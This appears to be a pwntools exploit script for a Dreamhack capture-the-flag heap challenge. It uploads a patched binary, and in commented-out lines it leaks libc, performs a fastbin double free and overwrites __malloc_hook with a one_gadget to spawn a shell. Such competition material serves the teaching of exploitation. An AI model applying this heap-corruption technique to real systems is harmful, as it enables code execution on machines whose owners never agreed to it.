#!/usr/bin/python3

from pwn import *

exe = ELF("./origin_bin_patched")
libc = ELF("./libc6_2.23-0ubuntu4_amd64.so")
context.binary = exe

s   = lambda data: p.send(data)
sa  = lambda msg, data: p.sendafter(msg, data)
sl  = lambda data: p.sendline(data)
sla = lambda msg, data: p.sendlineafter(msg, data)
sn  = lambda num: p.send(str(num).encode())
sna = lambda msg, num: p.sendafter(msg, str(num).encode())
sln = lambda num: p.sendline(str(num).encode())
slna = lambda msg, num: p.sendlineafter(msg, str(num).encode())
def GDB():
    if not args.REMOTE:
        gdb.attach(p, gdbscript='''
        b*main+39
        c
        ''')
        input()

def add(size, data):
    slna(b'> ', 1)
    slna(b'Size: ', size)
    sa(b'Data: ', data)

def dell(index):
    slna(b'> ', 2)
    slna(b'Idx: ', index)

def show(index):
    slna(b'> ', 3)
    slna(b'Idx: ', index)


if args.REMOTE:
    p = remote('host3.dreamhack.games', 17251)
else:
    p = process([exe.path])

p.recvuntil(b'Give me patch binary (base64): ')
with open(exe.path, 'rb') as f:
    patch_b64 = base64.b64encode(f.read())
p.sendline(patch_b64)


# GDB()
# show(-368)
# p.recvuntil(b'Data: ')
# libc_leak = u64(p.recv(6) + b'\0\0')
# log.info("libc leak :" + hex(libc_leak))
# libc.address = libc_leak - 0x3c38e0
# log.info("libc base :" + hex(libc.address))

# add(0x60, b'0')
# add(0x60, b'1')
# dell(0)
# dell(1)
# dell(0)
# add(0x60, p64(libc.sym.__malloc_hook - 27 - 8))
# add(0x60, b'0')
# add(0x60, b'1')
# add(0x60, b'a' * 11 + p64(libc.address + 0xf0567) + p64(libc.sym.realloc + 6)) #0,2,4,6,11,12
# slna(b'> ', 1)
# slna(b'Size: ', 96)


p.interactive()

